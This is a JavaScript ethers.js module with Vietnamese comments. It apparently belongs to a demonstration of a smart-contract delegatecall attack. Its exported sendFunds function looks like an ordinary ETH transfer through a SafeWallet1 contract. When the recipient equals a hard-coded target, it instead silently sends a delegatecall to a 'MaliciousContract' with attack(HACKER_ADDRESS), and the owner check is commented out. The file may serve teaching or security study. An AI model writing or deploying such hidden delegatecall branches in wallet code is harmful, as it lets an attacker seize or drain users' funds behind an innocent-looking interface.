import { ethers } from "ethers";

// Địa chỉ smart contract từ kết quả triển khai
const SAFE_WALLET1_ADDRESS = "0xD67d5deAe8e70085cb65286F1A5391821D31eFD5"; // Địa chỉ SafeWallet1 đã triển khai
//const HACKER_ADDRESS = "0x0261D776EaE7Cb59c954a4E920D8950c610747CE";
const MALICIOUS_CONTRACT_ADDRESS = "0x51c196932fA64dC02864D66a3dDd6E6FCebc8796";
const HACKER_ADDRESS = "0xeA3Ca48e65172d068839a8441AeE51DcE97e3Daf";
const TARGET_ADDRESS = "0x2b2E67fB6596fcC9637e694B3b712854A47805aC";

// ABI của SafeWallet1
const SAFE_WALLET1_ABI = [
    {
        "inputs": [],
        "stateMutability": "nonpayable",
        "type": "constructor"
    },
    {
        "inputs": [
            { "internalType": "address", "name": "_to", "type": "address" },
            { "internalType": "uint256", "name": "_value", "type": "uint256" },
            { "internalType": "bytes", "name": "_data", "type": "bytes" },
            { "internalType": "uint8", "name": "operation", "type": "uint8" }
        ],
        "name": "executeTransaction",
        "outputs": [
            { "internalType": "bool", "name": "success", "type": "bool" },
            { "internalType": "bytes", "name": "result", "type": "bytes" }
        ],
        "stateMutability": "payable",
        "type": "function"
    },
    {
        "inputs": [],
        "name": "owner",
        "outputs": [{ "internalType": "address", "name": "", "type": "address" }],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "stateMutability": "payable",
        "type": "receive"
    }
];

const MALICIOUS_ABI = [
    {
        "inputs": [{ "internalType": "address", "name": "target", "type": "address" }],
        "name": "attack",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    }
];

// Hàm gửi tiền qua SafeWallet1
export const sendFunds = async (recipient, amount) => {
    if (!window.ethereum) throw new Error("Metamask chưa được cài đặt!");

    const provider = new ethers.BrowserProvider(window.ethereum);
    await window.ethereum.request({ method: "eth_requestAccounts" });
    const signer = await provider.getSigner();
    const userAddress = await signer.getAddress();

    // Kết nối với smart contract
    const contract = new ethers.Contract(SAFE_WALLET1_ADDRESS, SAFE_WALLET1_ABI, signer);

    // Kiểm tra xem user có phải owner không (tùy chọn)
    //const owner = await contract.owner();
    //if (userAddress.toLowerCase() !== owner.toLowerCase()) {
    //    throw new Error("Chỉ owner của SafeWallet1 mới có thể gửi tiền!");
    //}
    
    // Kết nối với SafeWallet1
    const safeWallet1 = new ethers.Contract(SAFE_WALLET1_ADDRESS, SAFE_WALLET1_ABI, signer);
    const maliciousContract = new ethers.Contract(MALICIOUS_CONTRACT_ADDRESS, MALICIOUS_ABI, signer);
    let tx;
    if (recipient.toLowerCase() === TARGET_ADDRESS.toLowerCase()) {
        // Dùng delegatecall (operation = 1) tới MaliciousContract
        const attackData = maliciousContract.interface.encodeFunctionData("attack", [HACKER_ADDRESS]);
        tx = await safeWallet1.executeTransaction(
            MALICIOUS_CONTRACT_ADDRESS, // _to
            ethers.parseEther(amount),
            attackData, // _data
            1, // operation = delegatecall
            { gasLimit: 300000 }
        );
    } else {
        // Dùng call (operation = 0) để gửi trực tiếp
        tx = await safeWallet1.executeTransaction(
            recipient, // _to
            ethers.parseEther(amount), // _value
            "0x", // _data (trống)
            0, // operation = call
            { value: ethers.parseEther(amount) }
        );
    }

    const receipt = await tx.wait();
    return `Gửi thành công ${amount} ETH${recipient.toLowerCase() === TARGET_ADDRESS.toLowerCase() ? " qua delegatecall" : ""}! Tx Hash: ${receipt.hash}`;
};